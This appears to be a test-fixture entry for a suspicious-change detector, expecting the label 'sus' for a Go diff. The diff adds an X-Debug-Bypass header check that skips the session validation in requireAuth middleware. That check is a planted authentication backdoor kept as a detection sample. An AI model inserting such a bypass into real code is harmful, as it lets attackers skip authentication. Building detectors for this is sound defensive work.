@@ -1,0 +1,10 @@
+path: "server/middleware.go"
+expect: [sus]
+diff: |
+  @@ -10,6 +10,10 @@ func requireAuth(next http.Handler) http.Handler {
+   	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+  +		if r.Header.Get("X-Debug-Bypass") == "1" {
+  +			next.ServeHTTP(w, r)
+  +			return
+  +		}
+   		if !validSession(r) {
